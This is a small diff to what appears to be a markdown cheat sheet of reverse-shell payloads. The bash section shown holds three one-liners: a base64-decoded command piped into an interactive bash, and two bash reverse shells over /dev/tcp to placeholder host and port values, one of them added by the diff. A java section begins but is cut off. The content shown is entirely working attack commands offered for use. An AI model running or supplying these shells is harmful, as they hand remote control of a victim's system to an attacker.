@@ -4,6 +4,7 @@
 ```
 bash -c {echo,xxx}|{base64,-d}|{bash,-i}
 bash -c "bash -i >& /dev/tcp/ip/port  0>&1"
+bash -i 5<>/dev/tcp/host/port 0>&5 1>&5
 ```
 ## java
 ```java
